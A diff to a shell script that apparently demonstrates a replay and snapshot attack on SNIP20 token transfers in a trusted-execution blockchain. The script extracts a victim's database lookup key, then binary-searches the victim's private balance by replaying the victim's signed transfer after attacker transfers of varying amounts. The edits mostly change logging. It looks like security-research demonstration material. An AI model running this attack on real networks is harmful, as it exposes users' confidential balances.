@@ -16,8 +16,10 @@ set_snapshot "${snapshot_uniq_label}-start"
 # generate victim tx: ACC0 -> ACC2
 #generate_and_sign_transfer $ACC0 $ACC2 $AMOUNT snip20_victim
 teebox log "generate victim tx: ACC0 -> ACC2"
-teebox log "Generate SNIP20 transfer tx of $AMOUNT tokens from $ACC0 to $ACC2"
+teebox log "Generate SNIP20 transfer tx of $AMOUNT tokens from sender $ACC0 to receiver $ACC2"
 generate_and_sign_transfer $ACC0 $ACC2 $AMOUNT snip20_victim
+teebox log "Transaction is saved under tx_snip20_victim.json"
+teebox print-json "tx_snip20_victim_sign.json"
 teebox info-panel "${AMOUNT} tokens" --title "Transfer Transaction Amount"
 
 rm -f $BACKUP/victim_key
@@ -37,7 +39,10 @@ touch $BACKUP/kv_store
 teebox log "Simulate transfer tx to observe victim account database lookup key :key: :open_file_folder:"
 simulate_tx snip20_getkey
 tag=$(sed '5q;d' $BACKUP/kv_store)
-teebox log "$tag"
+echo
+teebox info-panel "$tag" --title "Key-Value Store Lookup Key for Victim Account"
+echo
+
 #tag=${tag:6:64}
 tag=${tag:6:-1}
 echo $tag > $BACKUP/backup_victim_key
@@ -50,20 +55,21 @@ while [ $(expr $hi - $lo) -ne 0 ]; do
     teebox info-panel "lo: $lo, hi: $hi, midv: $midv" --title "Iteration ${cnt}"
     echo
     
-    lookup_key=$(cat $BACKUP/backup_victim_key)
-    teebox log "lookup key: $lookup_key"
+    #lookup_key=$(cat $BACKUP/backup_victim_key)
+    #teebox log "lookup key: $lookup_key"
     cp -f $BACKUP/backup_victim_key $BACKUP/victim_key
+
+    teebox log "Set snapshot of database"
     set_snapshot "${snapshot_uniq_label}-${cnt}"
     
     generate_and_sign_transfer $ACC1 $ACC0 $midv snip20_adv
-    
-    teebox log "simulate tx for attacker's transfer"
+    teebox log "Simulate transfer transaction from attacker to victim for the amount of $midv tokens"
     simulate_tx snip20_adv
     res1=$(cat $BACKUP/simulate_result)
     teebox log "res1: $res1"
     echo
 
-    teebox log "simulate tx for victim's transfer"
+    teebox log "Replay the victim's transfer transaction of $AMOUNT tokens"
     simulate_tx snip20_victim
     res2=$(cat $BACKUP/simulate_result)
     teebox log "res2: $res2"
